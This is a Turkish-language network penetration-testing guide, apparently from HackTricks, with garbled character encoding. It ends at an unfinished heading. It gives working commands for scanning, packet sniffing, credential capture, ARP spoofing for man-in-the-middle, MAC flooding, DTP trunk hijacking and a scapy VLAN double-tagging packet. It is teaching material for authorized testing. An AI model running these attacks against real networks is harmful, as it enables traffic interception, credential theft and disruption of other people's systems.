# AÄŸÄ±n Pentest Edilmesi

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> ile sÄ±fÄ±rdan kahraman olmak iÃ§in AWS hackleme Ã¶ÄŸrenin<strong>!</strong></summary>

HackTricks'i desteklemenin diÄŸer yollarÄ±:

* Åirketinizi HackTricks'te **reklamÄ±nÄ±zÄ± gÃ¶rmek** veya **HackTricks'i PDF olarak indirmek** iÃ§in [**ABONELÄ°K PLANLARI**](https://github.com/sponsors/carlospolop)'na gÃ¶z atÄ±n!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* Ã–zel [**NFT'lerden**](https://opensea.io/collection/the-peass-family) oluÅŸan koleksiyonumuz [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'i keÅŸfedin
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katÄ±lÄ±n** veya **Twitter** ğŸ¦ [**@hacktricks_live**](https://twitter.com/hacktricks_live)'i **takip edin**.
* Hacking hilelerinizi **HackTricks** ve **HackTricks Cloud** github depolarÄ±na PR gÃ¶ndererek paylaÅŸÄ±n.

</details>

<img src="../../.gitbook/assets/i3.png" alt="" data-size="original">\
**Bounty ipucu**: **Hackerlar tarafÄ±ndan oluÅŸturulan premium bir bounty platformu olan Intigriti'ye** kaydolun! BugÃ¼n [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) adresinde bize katÄ±lÄ±n ve **$100,000**'e kadar Ã¶dÃ¼ller kazanmaya baÅŸlayÄ±n!

{% embed url="https://go.intigriti.com/hacktricks" %}

## DÄ±ÅŸarÄ±dan HostlarÄ±n KeÅŸfedilmesi

Bu, **Ä°nternet'ten yanÄ±t veren IP'leri** bulmanÄ±n **kÄ±sa bir bÃ¶lÃ¼mÃ¼** olacak.\
Bu durumda, bazÄ± **IP aralÄ±klarÄ±na** (belki de birkaÃ§ **aralÄ±k**) sahipsiniz ve sadece **hangi IP'lerin yanÄ±t verdiÄŸini** bulmanÄ±z gerekiyor.

### ICMP

Bir ana bilgisayarÄ±n Ã§alÄ±ÅŸÄ±p Ã§alÄ±ÅŸmadÄ±ÄŸÄ±nÄ± keÅŸfetmenin **en kolay** ve **en hÄ±zlÄ±** yolu budur.\
BazÄ± **ICMP** paketleri gÃ¶ndermeyi deneyebilir ve **yanÄ±tlar bekleyebilirsiniz**. En kolay yol, sadece bir **echo isteÄŸi** gÃ¶ndermek ve yanÄ±t beklemektir. Bunun iÃ§in basit bir `ping` veya **aralÄ±klar** iÃ§in `fping` kullanabilirsiniz.\
AyrÄ±ca **nmap** kullanarak diÄŸer tÃ¼rde ICMP paketleri gÃ¶nderebilirsiniz (bu, yaygÄ±n ICMP echo isteÄŸi-yanÄ±tÄ±na filtrelerin uygulanmasÄ±nÄ± engelleyecektir).
```bash
ping -c 1 199.66.11.4    # 1 echo request to a host
fping -g 199.66.11.0/24  # Send echo requests to ranges
nmap -PE -PM -PP -sn -n 199.66.11.0/24 #Send echo, timestamp requests and subnet mask requests
```
### TCP Port KeÅŸfi

Ã‡oÄŸu zaman, tÃ¼m tÃ¼rdeki ICMP paketlerinin filtrelenmiÅŸ olduÄŸunu gÃ¶rmek oldukÃ§a yaygÄ±ndÄ±r. Bu durumda, bir ana bilgisayarÄ±n Ã§alÄ±ÅŸÄ±p Ã§alÄ±ÅŸmadÄ±ÄŸÄ±nÄ± kontrol etmek iÃ§in yapabileceÄŸiniz tek ÅŸey, **aÃ§Ä±k portlarÄ± bulmaya Ã§alÄ±ÅŸmaktÄ±r**. Her bir ana bilgisayarÄ±n **65535 portu** bulunmaktadÄ±r, bu yÃ¼zden "bÃ¼yÃ¼k" bir kapsama sahipseniz, her bir ana bilgisayarÄ±n **her bir portunu** aÃ§Ä±k veya kapalÄ± olup olmadÄ±ÄŸÄ±na test edemezsiniz, bu Ã§ok fazla zaman alÄ±r.\
Bu durumda ihtiyacÄ±nÄ±z olan ÅŸey, **hÄ±zlÄ± bir port tarama aracÄ±** ([masscan](https://github.com/robertdavidgraham/masscan)) ve **daha sÄ±k kullanÄ±lan portlarÄ±n bir listesi:**
```bash
#Using masscan to scan top20ports of nmap in a /24 range (less than 5min)
masscan -p20,21-23,25,53,80,110,111,135,139,143,443,445,993,995,1723,3306,3389,5900,8080 199.66.11.0/24
```
Bu adÄ±mÄ± `nmap` ile de gerÃ§ekleÅŸtirebilirsiniz, ancak daha yavaÅŸ ve `nmap`'in hostlarÄ± tanÄ±mlama konusunda sorunlarÄ± olabilir.

### HTTP Port KeÅŸfi

Bu, HTTP hizmetlerini keÅŸfetmeye odaklanmak istediÄŸinizde kullanÄ±ÅŸlÄ± olan bir TCP port keÅŸfidir:
```bash
masscan -p80,443,8000-8100,8443 199.66.11.0/24
```
### UDP Port KeÅŸfi

Bir **ana bilgisayara** daha fazla **dikkat etmeniz gerekip gerekmediÄŸini** belirlemek iÃ§in **aÃ§Ä±k UDP portlarÄ±nÄ±** kontrol etmeyi deneyebilirsiniz. UDP hizmetleri genellikle dÃ¼zenli bir boÅŸ UDP sorgu paketine **herhangi bir veriyle yanÄ±t vermediÄŸi** iÃ§in bir portun filtrelenip aÃ§Ä±k olup olmadÄ±ÄŸÄ±nÄ± sÃ¶ylemek zordur. Bunun iÃ§in en kolay yol, Ã§alÄ±ÅŸan hizmetle ilgili bir paket gÃ¶ndermektir ve hangi hizmetin Ã§alÄ±ÅŸtÄ±ÄŸÄ±nÄ± bilmediÄŸiniz iÃ§in, olasÄ±lÄ±ÄŸa dayanarak en olasÄ± hizmeti denemelisiniz, port numarasÄ±na gÃ¶re:
```bash
nmap -sU -sV --version-intensity 0 -F -n 199.66.11.53/24
# The -sV will make nmap test each possible known UDP service packet
# The "--version-intensity 0" will make nmap only test the most probable
```
Ã–nerilen nmap komutu, **/24** aralÄ±ÄŸÄ±ndaki her bir ana bilgisayarda **en Ã¼st 1000 UDP portunu** test edecektir, ancak sadece bu bile **>20 dakika** sÃ¼recektir. EÄŸer **en hÄ±zlÄ± sonuÃ§lara** ihtiyacÄ±nÄ±z varsa, [**udp-proto-scanner**](https://github.com/portcullislabs/udp-proto-scanner) aracÄ±nÄ± kullanabilirsiniz: `./udp-proto-scanner.pl 199.66.11.53/24` Bu, bu **UDP sorgularÄ±nÄ±** beklenen baÄŸlantÄ± noktalarÄ±na gÃ¶nderecektir (bir /24 aralÄ±ÄŸÄ± iÃ§in sadece 1 dakika sÃ¼recektir): _DNSStatusRequest, DNSVersionBindReq, NBTStat, NTPRequest, RPCCheck, SNMPv3GetRequest, chargen, citrix, daytime, db2, echo, gtpv1, ike,ms-sql, ms-sql-slam, netop, ntp, rpc, snmp-public, systat, tftp, time, xdmcp._

### SCTP Port KeÅŸfi
```bash
#Probably useless, but it's pretty fast, why not trying?
nmap -T4 -sY -n --open -Pn <IP/range>
```
## Wifi Pentest

Ä°ÅŸte yazÄ±ldÄ±ÄŸÄ± zaman bilinen tÃ¼m Wifi saldÄ±rÄ±larÄ±nÄ±n gÃ¼zel bir rehberini bulabilirsiniz:

{% content-ref url="../pentesting-wifi/" %}
[pentesting-wifi](../pentesting-wifi/)
{% endcontent-ref %}

## Ä°Ã§eriden Host KeÅŸfi

AÄŸÄ±n iÃ§indeyseniz yapmak isteyeceÄŸiniz ilk ÅŸeylerden biri **diÄŸer hostlarÄ± keÅŸfetmek** olacaktÄ±r. **Ne kadar gÃ¼rÃ¼ltÃ¼** yapmak istediÄŸinize baÄŸlÄ± olarak farklÄ± eylemler gerÃ§ekleÅŸtirilebilir:

### Pasif

BaÄŸlÄ± bir aÄŸ iÃ§indeki hostlarÄ± pasif olarak keÅŸfetmek iÃ§in bu araÃ§larÄ± kullanabilirsiniz:
```bash
netdiscover -p
p0f -i eth0 -p -o /tmp/p0f.log
# Bettercap
net.recon on/off #Read local ARP cache periodically
net.show
set net.show.meta true #more info
```
### Aktif

DÄ±ÅŸarÄ±dan sunucularÄ± keÅŸfetme teknikleri hakkÄ±nda yapÄ±lan yorumlar [_**DÄ±ÅŸarÄ±dan sunucularÄ± keÅŸfetme**_](./#discovering-hosts-from-the-outside) (_TCP/HTTP/UDP/SCTP Port KeÅŸfi_) bÃ¶lÃ¼mÃ¼nde de **burada uygulanabilir**.\
Ancak, diÄŸer sunucularla **aynÄ± aÄŸda** olduÄŸunuz iÃ§in **daha fazla ÅŸey yapabilirsiniz**:
```bash
#ARP discovery
nmap -sn <Network> #ARP Requests (Discover IPs)
netdiscover -r <Network> #ARP requests (Discover IPs)

#NBT discovery
nbtscan -r 192.168.0.1/24 #Search in Domain

# Bettercap
net.probe on/off #Discover hosts on current subnet by probing with ARP, mDNS, NBNS, UPNP, and/or WSD
set net.probe.mdns true/false #Enable mDNS discovery probes (default=true)
set net.probe.nbns true/false #Enable NetBIOS name service discovery probes (default=true)
set net.probe.upnp true/false #Enable UPNP discovery probes (default=true)
set net.probe.wsd true/false #Enable WSD discovery probes (default=true)
set net.probe.throttle 10 #10ms between probes sent (default=10)

#IPv6
alive6 <IFACE> # Send a pingv6 to multicast.
```
### Aktif ICMP

Dikkat edilmesi gereken nokta, _DÄ±ÅŸarÄ±dan ana bilgisayarlarÄ± keÅŸfetme_ baÅŸlÄ±ÄŸÄ±nda bahsedilen tekniklerin (_**ICMP**_) burada da **uygulanabileceÄŸidir**.\
Ancak, diÄŸer ana bilgisayarlarla **aynÄ± aÄŸda** olduÄŸunuz iÃ§in **daha fazla ÅŸey yapabilirsiniz**:

* EÄŸer bir **alt aÄŸ yayÄ±n adresine ping** atarsanÄ±z, ping her bir ana bilgisayara ulaÅŸmalÄ± ve onlar da **size yanÄ±t verebilir**: `ping -b 10.10.5.255`
* AÄŸ yayÄ±n adresine ping atarak, **diÄŸer alt aÄŸlardaki** ana bilgisayarlarÄ± bile bulabilirsiniz: `ping -b 255.255.255.255`
* `nmap`'in `-PE`, `-PP`, `-PM` bayraklarÄ±nÄ± kullanarak, sÄ±rasÄ±yla **ICMPv4 echo**, **zaman damgasÄ±** ve **alt aÄŸ maskesi istekleri** gÃ¶ndererek ana bilgisayar keÅŸfi yapabilirsiniz: `nmap -PE -PM -PP -sn -vvv -n 10.12.5.0/24`

### **Wake On Lan**

Wake On Lan, bir **aÄŸ mesajÄ±** aracÄ±lÄ±ÄŸÄ±yla bilgisayarlarÄ± **aÃ§mak** iÃ§in kullanÄ±lÄ±r. BilgisayarÄ± aÃ§mak iÃ§in kullanÄ±lan sihirli paket, sadece bir **MAC Dst** adresinin saÄŸlandÄ±ÄŸÄ± ve ardÄ±ndan aynÄ± paket iÃ§inde **16 kez tekrarlandÄ±ÄŸÄ±** bir pakettir.\
Bu tÃ¼r paketler genellikle bir **ethernet 0x0842** veya **9 numaralÄ± baÄŸlantÄ± noktasÄ±na UDP paketi** olarak gÃ¶nderilir.\
EÄŸer **bir \[MAC]** saÄŸlanmazsa, paket **yayÄ±n ethernetine** gÃ¶nderilir (ve tekrarlanacak yayÄ±n MAC adresi olur).
```bash
# Bettercap (if no [MAC] is specificed ff:ff:ff:ff:ff:ff will be used/entire broadcast domain)
wol.eth [MAC] #Send a WOL as a raw ethernet packet of type 0x0847
wol.udp [MAC] #Send a WOL as an IPv4 broadcast packet to UDP port 9
```
## Host Tarama

Derinlemesine taramak istediÄŸiniz tÃ¼m IP'leri (harici veya dahili) keÅŸfettikten sonra, farklÄ± eylemler gerÃ§ekleÅŸtirilebilir.

### TCP

* **AÃ§Ä±k** port: _SYN --> SYN/ACK --> RST_
* **KapalÄ±** port: _SYN --> RST/ACK_
* **FiltrelenmiÅŸ** port: _SYN --> \[YANIT YOK]_
* **FiltrelenmiÅŸ** port: _SYN --> ICMP mesajÄ±_
```bash
# Nmap fast scan for the most 1000tcp ports used
nmap -sV -sC -O -T4 -n -Pn -oA fastscan <IP>
# Nmap fast scan for all the ports
nmap -sV -sC -O -T4 -n -Pn -p- -oA fullfastscan <IP>
# Nmap fast scan for all the ports slower to avoid failures due to -T4
nmap -sV -sC -O -p- -n -Pn -oA fullscan <IP>

#Bettercap Scan
syn.scan 192.168.1.0/24 1 10000 #Ports 1-10000
```
### UDP

Bir UDP portunu taramak iÃ§in 2 seÃ§enek vardÄ±r:

* Bir **UDP paketi** gÃ¶nderin ve port **kapalÄ±** ise yanÄ±t olarak _**ICMP eriÅŸilemez**_ mesajÄ±nÄ± kontrol edin (birÃ§ok durumda ICMP **filtrelenir** bu yÃ¼zden port kapalÄ± veya aÃ§Ä±k ise herhangi bir bilgi alamazsÄ±nÄ±z).
* Bir **hizmetten** (Ã¶rneÄŸin DNS, DHCP, TFTP ve diÄŸerleri, _nmap-payloads_ listesinde belirtilenler gibi) yanÄ±t almak iÃ§in **biÃ§imlendirilmiÅŸ datagramlar** gÃ¶nderin. Bir **yanÄ±t** alÄ±rsanÄ±z, port **aÃ§Ä±ktÄ±r**.

**Nmap**, "-sV" kullanarak her iki seÃ§eneÄŸi de **karÄ±ÅŸtÄ±racaktÄ±r** (UDP taramalarÄ± Ã§ok yavaÅŸtÄ±r), ancak UDP taramalarÄ±nÄ±n TCP taramalarÄ±ndan daha yavaÅŸ olduÄŸunu unutmayÄ±n:
```bash
# Check if any of the most common udp services is running
udp-proto-scanner.pl <IP>
# Nmap fast check if any of the 100 most common UDP services is running
nmap -sU -sV --version-intensity 0 -n -F -T4 <IP>
# Nmap check if any of the 100 most common UDP services is running and launch defaults scripts
nmap -sU -sV -sC -n -F -T4 <IP>
# Nmap "fast" top 1000 UDP ports
nmap -sU -sV --version-intensity 0 -n -T4 <IP>
# You could use nmap to test all the UDP ports, but that will take a lot of time
```
### SCTP TaramasÄ±

**SCTP (AkÄ±ÅŸ Kontrol Ä°letim ProtokolÃ¼)**, **TCP (AktarÄ±m Kontrol ProtokolÃ¼)** ve **UDP (KullanÄ±cÄ± Datagram ProtokolÃ¼)** ile birlikte kullanÄ±lmak Ã¼zere tasarlanmÄ±ÅŸtÄ±r. Temel amacÄ±, IP aÄŸlarÄ± Ã¼zerinden telefon verilerinin iletimini kolaylaÅŸtÄ±rmaktÄ±r ve **Sinyal Sistemi 7 (SS7)**'de bulunan birÃ§ok gÃ¼venilirlik Ã¶zelliÄŸini yansÄ±tmaktadÄ±r. **SCTP**, SS7 sinyallerini IP aÄŸlarÄ± Ã¼zerinden taÅŸÄ±mak amacÄ±yla oluÅŸturulan **SIGTRAN** protokol ailesinin temel bir bileÅŸenidir.

**SCTP** desteÄŸi, **IBM AIX**, **Oracle Solaris**, **HP-UX**, **Linux**, **Cisco IOS** ve **VxWorks** gibi Ã§eÅŸitli iÅŸletim sistemleri tarafÄ±ndan saÄŸlanmaktadÄ±r, bu da telekomÃ¼nikasyon ve aÄŸ alanÄ±nda geniÅŸ kabul ve kullanÄ±labilirliÄŸini gÃ¶stermektedir.

Nmap tarafÄ±ndan SCTP iÃ§in sunulan iki farklÄ± tarama seÃ§eneÄŸi vardÄ±r: _-sY_ ve _-sZ_
```bash
# Nmap fast SCTP scan
nmap -T4 -sY -n -oA SCTFastScan <IP>
# Nmap all SCTP scan
nmap -T4 -p- -sY -sV -sC -F -n -oA SCTAllScan <IP>
```
### IDS ve IPS kaÃ§Ä±nma

{% content-ref url="ids-evasion.md" %}
[ids-evasion.md](ids-evasion.md)
{% endcontent-ref %}

### **Daha fazla nmap seÃ§eneÄŸi**

{% content-ref url="nmap-summary-esp.md" %}
[nmap-summary-esp.md](nmap-summary-esp.md)
{% endcontent-ref %}

### Ä°Ã§ IP Adreslerini Ortaya Ã‡Ä±karma

**YanlÄ±ÅŸ yapÄ±landÄ±rÄ±lmÄ±ÅŸ yÃ¶nlendiriciler, gÃ¼venlik duvarlarÄ± ve aÄŸ cihazlarÄ±** bazen aÄŸ taramalarÄ±na **kamu dÄ±ÅŸÄ± kaynak adresleri** kullanarak yanÄ±t verebilir. **tcpdump**, test sÄ±rasÄ±nda Ã¶zel adreslerden alÄ±nan paketleri tespit etmek iÃ§in kullanÄ±labilir. Ã–zellikle Kali Linux Ã¼zerinde, paketler **eth2 arayÃ¼zÃ¼** Ã¼zerinde yakalanabilir ve bu arayÃ¼z halka aÃ§Ä±k internetten eriÅŸilebilir. Ancak, kurulumunuz bir NAT veya bir GÃ¼venlik DuvarÄ± arkasÄ±nda ise, bu tÃ¼r paketlerin filtrelenmesi muhtemeldir.
```bash
tcpdump â€“nt -i eth2 src net 10 or 172.16/12 or 192.168/16
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on eth2, link-type EN10MB (Ethernet), capture size 65535 bytes
IP 10.10.0.1 > 185.22.224.18: ICMP echo reply, id 25804, seq 1582, length 64
IP 10.10.0.2 > 185.22.224.18: ICMP echo reply, id 25804, seq 1586, length 64
```
## Sniffing (KokuÅŸma)

KokuÅŸma, yakalanan Ã§erÃ§eveler ve paketlerin incelenmesi yoluyla IP aralÄ±klarÄ±nÄ±n, alt aÄŸ boyutlarÄ±nÄ±n, MAC adreslerinin ve ana bilgisayar adlarÄ±nÄ±n ayrÄ±ntÄ±larÄ±nÄ± Ã¶ÄŸrenebilmenizi saÄŸlar. AÄŸ yanlÄ±ÅŸ yapÄ±landÄ±rÄ±lmÄ±ÅŸ veya anahtarlamalÄ± yapÄ± stres altÄ±nda ise saldÄ±rganlar, pasif aÄŸ kokuÅŸmasÄ± yoluyla hassas materyalleri yakalayabilirler.

EÄŸer bir anahtarlamalÄ± Ethernet aÄŸÄ± doÄŸru ÅŸekilde yapÄ±landÄ±rÄ±lmÄ±ÅŸsa, yalnÄ±zca yayÄ±n Ã§erÃ§evelerini ve MAC adresinize yÃ¶nlendirilen materyalleri gÃ¶receksiniz.

### TCPDump
```bash
sudo tcpdump -i <INTERFACE> udp port 53 #Listen to DNS request to discover what is searching the host
tcpdump -i <IFACE> icmp #Listen to icmp packets
sudo bash -c "sudo nohup tcpdump -i eth0 -G 300 -w \"/tmp/dump-%m-%d-%H-%M-%S-%s.pcap\" -W 50 'tcp and (port 80 or port 443)' &"
```
AyrÄ±ca, Wireshark'Ä± GUI olarak kullanarak SSH oturumu Ã¼zerinden uzaktaki bir makineden paketleri gerÃ§ek zamanlÄ± olarak yakalayabilirsiniz.
```
ssh user@<TARGET IP> tcpdump -i ens160 -U -s0 -w - | sudo wireshark -k -i -
ssh <USERNAME>@<TARGET IP> tcpdump -i <INTERFACE> -U -s0 -w - 'port not 22' | sudo wireshark -k -i - # Exclude SSH traffic
```
Bettercap, a powerful network tool, is used for network monitoring, analysis, and attacks. It provides a wide range of features and capabilities for pentesting purposes. Bettercap can be used to perform various tasks such as sniffing network traffic, conducting man-in-the-middle attacks, and performing DNS spoofing. It also supports plugins, allowing users to extend its functionality. Bettercap is a valuable tool for both offensive and defensive security professionals.
```bash
net.sniff on
net.sniff stats
set net.sniff.output sniffed.pcap #Write captured packets to file
set net.sniff.local  #If true it will consider packets from/to this computer, otherwise it will skip them (default=false)
set net.sniff.filter #BPF filter for the sniffer (default=not arp)
set net.sniff.regexp #If set only packets matching this regex will be considered
```
### Wireshark

AÃ§Ä±kÃ§asÄ±.

### Kimlik bilgilerini yakalama

[https://github.com/lgandx/PCredz](https://github.com/lgandx/PCredz) gibi araÃ§larÄ± kullanarak kimlik bilgilerini bir pcap veya canlÄ± bir arayÃ¼zden ayrÄ±ÅŸtÄ±rabilirsiniz.

## LAN saldÄ±rÄ±larÄ±

### ARP sahtekarlÄ±ÄŸÄ±

ARP sahtekarlÄ±ÄŸÄ±, bir makinenin IP'sinin cihazÄ±mÄ±zÄ±n MAC adresine sahip olduÄŸunu gÃ¶stermek iÃ§in gereksiz ARP yanÄ±tlarÄ± gÃ¶ndermekten oluÅŸur. ArdÄ±ndan, kurban ARP tablosunu deÄŸiÅŸtirecek ve sahte IP'yi iletiÅŸim kurmak istediÄŸinde her seferinde makinemize baÅŸvuracaktÄ±r.

#### **Bettercap**
```bash
arp.spoof on
set arp.spoof.targets <IP> #Specific targets to ARP spoof (default=<entire subnet>)
set arp.spoof.whitelist #Specific targets to skip while spoofing
set arp.spoof.fullduplex true #If true, both the targets and the gateway will be attacked, otherwise only the target (default=false)
set arp.spoof.internal true #If true, local connections among computers of the network will be spoofed, otherwise only connections going to and coming from the Internet (default=false)
```
Arpspoof, aÄŸ Ã¼zerindeki ARP tablosunu manipÃ¼le etmek iÃ§in kullanÄ±lan bir araÃ§tÄ±r. Bu araÃ§, saldÄ±rganÄ±n aÄŸ trafiÄŸini yÃ¶nlendirmesine ve aÄŸdaki diÄŸer cihazlarÄ± yanÄ±ltmasÄ±na olanak tanÄ±r. Arpspoof, MITM (Man-in-the-Middle) saldÄ±rÄ±larÄ± gerÃ§ekleÅŸtirmek iÃ§in sÄ±klÄ±kla kullanÄ±lÄ±r. Bu saldÄ±rÄ± tÃ¼rÃ¼nde, saldÄ±rgan, hedef cihazÄ±n ARP tablosunu manipÃ¼le ederek, hedef cihazÄ±n aÄŸ trafiÄŸini saldÄ±rganÄ±n kontrol ettiÄŸi bir ara sunucuya yÃ¶nlendirir. Bu sayede saldÄ±rgan, hedef cihazÄ±n aÄŸ trafiÄŸini izleyebilir, deÄŸiÅŸtirebilir veya Ã§alabilir. Arpspoof, aÄŸ gÃ¼venlik testlerinde ve etik hackleme (pentesting) faaliyetlerinde kullanÄ±lan yaygÄ±n bir araÃ§tÄ±r.
```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
arpspoof -t 192.168.1.1 192.168.1.2
arpspoof -t 192.168.1.2 192.168.1.1
```
### MAC Flooding - CAM taÅŸmasÄ±

AnahtarÄ± CAM tablosunu taÅŸarak, farklÄ± kaynak MAC adresleriyle birÃ§ok paket gÃ¶nderin. CAM tablosu dolu olduÄŸunda anahtar, tÃ¼m trafiÄŸi yayÄ±nlayan bir hub gibi davranmaya baÅŸlar.
```bash
macof -i <interface>
```
Modern switchlerde bu zafiyet giderilmiÅŸtir.

### 802.1Q VLAN / DTP SaldÄ±rÄ±larÄ±

#### Dinamik Trunking

**Dinamik Trunking ProtokolÃ¼ (DTP)**, anahtarlamayÄ± otomatikleÅŸtirmek iÃ§in tasarlanmÄ±ÅŸ bir baÄŸlantÄ± katmanÄ± protokolÃ¼dÃ¼r. Bu protokol, anahtarlarÄ±n otomatik olarak trunk modu (Trunk) veya non-trunk modu iÃ§in portlarÄ± seÃ§mesine olanak tanÄ±r. **DTP**'nin kullanÄ±lmasÄ± genellikle alt-optimal aÄŸ tasarÄ±mÄ±nÄ±n bir gÃ¶stergesi olarak gÃ¶rÃ¼lÃ¼r ve sadece gerektiÄŸi yerlerde trunck'larÄ±n manuel olarak yapÄ±landÄ±rÄ±lmasÄ± ve uygun belgelemenin saÄŸlanmasÄ± Ã¶nemlidir.

VarsayÄ±lan olarak, anahtar portlarÄ± Dinamik Otomatik modunda Ã§alÄ±ÅŸacak ÅŸekilde ayarlanÄ±r, yani komÅŸu bir anahtar tarafÄ±ndan istendiÄŸinde trunking'i baÅŸlatabilecek durumdadÄ±r. Bir pentester veya saldÄ±rgan anahtara baÄŸlandÄ±ÄŸÄ±nda ve bir DTP Desirable Ã§erÃ§evesi gÃ¶nderdiÄŸinde, portun trunk moduna girmesi saÄŸlanÄ±r. Bu eylem, saldÄ±rganÄ±n STP Ã§erÃ§eve analizi aracÄ±lÄ±ÄŸÄ±yla VLAN'larÄ± numaralandÄ±rmasÄ±na ve sanal arayÃ¼zler kurarak VLAN segmentasyonunu atlamasÄ±na olanak tanÄ±r.

BirÃ§ok anahtarÄ±n varsayÄ±lan olarak DTP'yi iÃ§ermesi, saldÄ±rganlarÄ±n bir anahtarÄ±n davranÄ±ÅŸÄ±nÄ± taklit ederek tÃ¼m VLAN'lardaki trafiÄŸe eriÅŸim elde etmesini saÄŸlayabilir. [_**dtpscan.sh**_](https://github.com/commonexploits/dtpscan) adlÄ± betik, bir arabirimi izlemek iÃ§in kullanÄ±lÄ±r ve bir anahtarÄ±n VarsayÄ±lan, Trunk, Dinamik, Otomatik veya EriÅŸim modunda olup olmadÄ±ÄŸÄ±nÄ± ortaya Ã§Ä±karÄ±r - sonuncusu VLAN atlama saldÄ±rÄ±larÄ±na karÅŸÄ± baÄŸÄ±ÅŸÄ±klÄ±k saÄŸlayan tek yapÄ±landÄ±rmadÄ±r. Bu araÃ§, anahtarÄ±n zafiyet durumunu deÄŸerlendirir.

AÄŸ zafiyeti tespit edildiÄŸinde, _**Yersinia**_ aracÄ± DTP protokolÃ¼ aracÄ±lÄ±ÄŸÄ±yla "trunking'i etkinleÅŸtirmek" iÃ§in kullanÄ±labilir ve bu sayede tÃ¼m VLAN'lardan gelen paketlerin gÃ¶zlemlenmesine olanak tanÄ±r.
```bash
apt-get install yersinia #Installation
sudo apt install kali-linux-large #Another way to install it in Kali
yersinia -I #Interactive mode
#In interactive mode you will need to select a interface first
#Then, you can select the protocol to attack using letter "g"
#Finally, you can select the attack using letter "x"

yersinia -G #For graphic mode
```
![](<../../.gitbook/assets/image (646) (1).png>)

VLAN'larÄ± numaralandÄ±rmak iÃ§in [**DTPHijacking.py**](https://github.com/in9uz/VLANPWN/blob/main/DTPHijacking.py)** adlÄ± betikle DTP Desirable Ã§erÃ§evesi oluÅŸturmak da mÃ¼mkÃ¼ndÃ¼r.** BetiÄŸi hiÃ§bir durumda kesmeyin. Her Ã¼Ã§ saniyede bir DTP Desirable enjekte eder. **Anahtar Ã¼zerinde dinamik olarak oluÅŸturulan trunk kanallarÄ± sadece beÅŸ dakika boyunca aktiftir. BeÅŸ dakika sonra trunk dÃ¼ÅŸer.**
```
sudo python3 DTPHijacking.py --interface eth0
```
**EriÅŸim/Ä°stenilen (0x03)** ifadesi, DTP Ã§erÃ§evesinin Ä°stenilen tÃ¼rde olduÄŸunu ve baÄŸlantÄ± noktasÄ±nÄ±n Trunk moduna geÃ§mesini sÃ¶ylediÄŸini belirtir. Ve **802.1Q/802.1Q (0xa5)**, **802.1Q** kapsÃ¼lleme tÃ¼rÃ¼nÃ¼ belirtir.

STP Ã§erÃ§evelerini analiz ederek, **VLAN 30 ve VLAN 60'Ä±n varlÄ±ÄŸÄ± hakkÄ±nda bilgi ediniriz.**

<figure><img src="../../.gitbook/assets/image (18) (1).png" alt=""><figcaption></figcaption></figure>

#### Belirli VLAN'lara SaldÄ±rma

VLAN kimlikleri ve IP deÄŸerlerini bildiÄŸinizde, **belirli bir VLAN'a saldÄ±rmak iÃ§in sanal bir arayÃ¼z yapÄ±landÄ±rabilirsiniz**.\
DHCP kullanÄ±lamÄ±yorsa, _ifconfig_ kullanarak bir statik IP adresi ayarlayÄ±n.
```
root@kali:~# modprobe 8021q
root@kali:~# vconfig add eth1 250
Added VLAN with VID == 250 to IF -:eth1:-
root@kali:~# dhclient eth1.250
Reloading /etc/samba/smb.conf: smbd only.
root@kali:~# ifconfig eth1.250
eth1.250  Link encap:Ethernet  HWaddr 00:0e:c6:f0:29:65
inet addr:10.121.5.86  Bcast:10.121.5.255  Mask:255.255.255.0
inet6 addr: fe80::20e:c6ff:fef0:2965/64 Scope:Link
UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
RX packets:19 errors:0 dropped:0 overruns:0 frame:0
TX packets:13 errors:0 dropped:0 overruns:0 carrier:0
collisions:0 txqueuelen:0
RX bytes:2206 (2.1 KiB)  TX bytes:1654 (1.6 KiB)

root@kali:~# arp-scan -I eth1.250 10.121.5.0/24
```

```bash
# Another configuration example
modprobe 8021q
vconfig add eth1 20
ifconfig eth1.20 192.168.1.2 netmask 255.255.255.0 up
```

```bash
# Another configuration example
sudo vconfig add eth0 30
sudo ip link set eth0.30 up
sudo dhclient -v eth0.30
```
#### Otomatik VLAN Atlama

**Dinamik Trunking** saldÄ±rÄ±sÄ± ve diÄŸer VLAN'larÄ±n iÃ§indeki **sanal arayÃ¼zler oluÅŸturma ve hostlarÄ± keÅŸfetme** konusu, [**https://github.com/nccgroup/vlan-hopping---frogger**](https://github.com/nccgroup/vlan-hopping---frogger) adlÄ± araÃ§ tarafÄ±ndan **otomatik olarak gerÃ§ekleÅŸtirilir**.

#### Ã‡ift Etiketleme

Bir saldÄ±rgan, **hedef ana bilgisayarÄ±n MAC, IP ve VLAN KimliÄŸi** deÄŸerlerini bildiÄŸi takdirde, belirlenen VLAN ve hedefin VLAN'Ä±yla birlikte bir Ã§erÃ§eveyi **Ã§ift etiketleyebilir** ve bir paket gÃ¶nderebilir. **Hedef, saldÄ±rganla geri baÄŸlantÄ± kuramayacaÄŸÄ±ndan**, saldÄ±rgan iÃ§in **en iyi seÃ§enek UDP Ã¼zerinden iletiÅŸim kurmaktÄ±r**. Bu ÅŸekilde, SNMP gibi bazÄ± ilginÃ§ eylemler gerÃ§ekleÅŸtirebilen protokollere yÃ¶nlendirme yapÄ±labilir.

SaldÄ±rganÄ±n baÅŸka bir seÃ§eneÄŸi, saldÄ±rgan tarafÄ±ndan kontrol edilen ve hedef tarafÄ±ndan eriÅŸilebilen bir IP'yi taklit ederek **TCP port taramasÄ± baÅŸlatmaktÄ±r**. ArdÄ±ndan, saldÄ±rgan, ikinci bir ana bilgisayarda sahip olduÄŸu hedeften gelen bazÄ± paketleri dinleyebilir.

Bu saldÄ±rÄ±yÄ± gerÃ§ekleÅŸtirmek iÃ§in scapy kullanabilirsiniz: `pip install scapy`
```python
from scapy.all import *
# Double tagging with ICMP packet (the response from the victim isn't double tagged so it will never reach the attacker)
packet = Ether()/Dot1Q(vlan=1)/Dot1Q(vlan=20)/IP(dst='192.168.1.10')/ICMP()
sendp(packet)
```
#### Lateral VLAN Segmentasyonu Atlama <a href="#d679" id="d679"></a>

